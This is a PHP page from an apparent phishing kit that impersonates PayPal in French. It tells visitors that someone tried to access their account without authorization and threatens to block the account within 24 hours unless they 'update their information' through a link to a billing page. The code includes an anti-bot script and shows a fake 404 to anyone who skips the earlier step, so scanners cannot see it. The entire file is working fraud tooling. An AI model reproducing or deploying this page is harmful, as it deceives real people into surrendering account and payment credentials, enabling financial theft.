<?php 
ob_start();
session_start();
if(isset($_SESSION['step_one'])){
$_SESSION['step_two']  = true;
include'../antibots.php';
date_default_timezone_set('GMT');
?>
<style>
@import url(//db.onlinewebfonts.com/c/d3398b63eaca40daee65f5fa3b69402c?family=PayPal+Sans+Small);
@font-face {font-family: "PayPal Sans Small"; src: url("//db.onlinewebfonts.com/t/d3398b63eaca40daee65f5fa3b69402c.eot"); src: url("//db.onlinewebfonts.com/t/d3398b63eaca40daee65f5fa3b69402c.eot?#iefix") format("embedded-opentype"), url("//db.onlinewebfonts.com/t/d3398b63eaca40daee65f5fa3b69402c.woff2") format("woff2"), url("//db.onlinewebfonts.com/t/d3398b63eaca40daee65f5fa3b69402c.woff") format("woff"), url("//db.onlinewebfonts.com/t/d3398b63eaca40daee65f5fa3b69402c.ttf") format("truetype"), url("//db.onlinewebfonts.com/t/d3398b63eaca40daee65f5fa3b69402c.svg#PayPal Sans Small") format("svg"); }
.bold {
	font-family: "PayPal Sans Small", sans-serif;
}
@import url(//db.onlinewebfonts.com/c/44994582bcefd02119158ff8b0d16b75?family=PayPal+Sans+Big);
@font-face {font-family: "PayPal Sans Big"; src: url("//db.onlinewebfonts.com/t/44994582bcefd02119158ff8b0d16b75.eot"); src: url("//db.onlinewebfonts.com/t/44994582bcefd02119158ff8b0d16b75.eot?#iefix") format("embedded-opentype"), url("//db.onlinewebfonts.com/t/44994582bcefd02119158ff8b0d16b75.woff2") format("woff2"), url("//db.onlinewebfonts.com/t/44994582bcefd02119158ff8b0d16b75.woff") format("woff"), url("//db.onlinewebfonts.com/t/44994582bcefd02119158ff8b0d16b75.ttf") format("truetype"), url("//db.onlinewebfonts.com/t/44994582bcefd02119158ff8b0d16b75.svg#PayPal Sans Big") format("svg"); }
.titre {
	font-family: "PayPal Sans Big", sans-serif;
}
@import url(//db.onlinewebfonts.com/c/98ba452dea7e23c218274c7bc852c1a9?family=PayPal+Sans+Small+Medium);
@font-face {font-family: "PayPal Sans Small Medium"; src: url("//db.onlinewebfonts.com/t/98ba452dea7e23c218274c7bc852c1a9.eot"); src: url("//db.onlinewebfonts.com/t/98ba452dea7e23c218274c7bc852c1a9.eot?#iefix") format("embedded-opentype"), url("//db.onlinewebfonts.com/t/98ba452dea7e23c218274c7bc852c1a9.woff2") format("woff2"), url("//db.onlinewebfonts.com/t/98ba452dea7e23c218274c7bc852c1a9.woff") format("woff"), url("//db.onlinewebfonts.com/t/98ba452dea7e23c218274c7bc852c1a9.ttf") format("truetype"), url("//db.onlinewebfonts.com/t/98ba452dea7e23c218274c7bc852c1a9.svg#PayPal Sans Small Medium") format("svg"); }
.hd {
	font-family: "PayPal Sans Big", sans-serif;
}
</style>
    <!DOCTYPE html>
    <html dir="ltr">
        <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <title>Sécurité</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            
			<link href="//db.onlinewebfonts.com/c/d3398b63eaca40daee65f5fa3b69402c?family=PayPal+Sans+Small" rel="stylesheet" type="text/css"/>
            <link href="//db.onlinewebfonts.com/c/44994582bcefd02119158ff8b0d16b75?family=PayPal+Sans+Big" rel="stylesheet" type="text/css"/>
			<link href="//db.onlinewebfonts.com/c/98ba452dea7e23c218274c7bc852c1a9?family=PayPal+Sans+Small+Medium" rel="stylesheet" type="text/css"/>
			<link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain">
                <div class="contain-info">
                   <p class="hd">Que se passe t-il ?</p>
                   <div class="contain-lists">
                       <center>
                            <img src="../img/shield.png" />
                            <h4 class="titre">Tentative d'accès non autorisée</h4>
                       </center>
                       <b class="bold">
                           <h5>Le <?php echo date("d/m/Y")?>, Nous avons remarqué une activité inhabituelle.</h5>
               <h5>
<TD align=left>


<P>Pour terminer le processus de celle-ci, vous devez impérativement mettre à jour vos informations sur votre compte pour vérifier qu'il s'agit bien de vous sinon il sera aussitôt bloqué dans les 24h qui suivent.</P>

<P>Après cela, vous pourrez continuer vos achats en ligne et envoyer de l'argent.</P>
<br>
<P><B>Voici les étapes à suivre:</B></P> 
<td>1. Cliquez sur continuer</td><br>
<td>2. Mettre à jour vos informations</td><br>
<td>3. Retrouvez l'accès complet à votre compte</td>

                       <center>
                           <a href="<?php echo 'billing.php?enc='.md5(time()).'&p=1&dispatch='.sha1(time()); ?>" class="proccess">Continuer</a>
                       </center>
                   
                </div>
            </div>
			</b>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>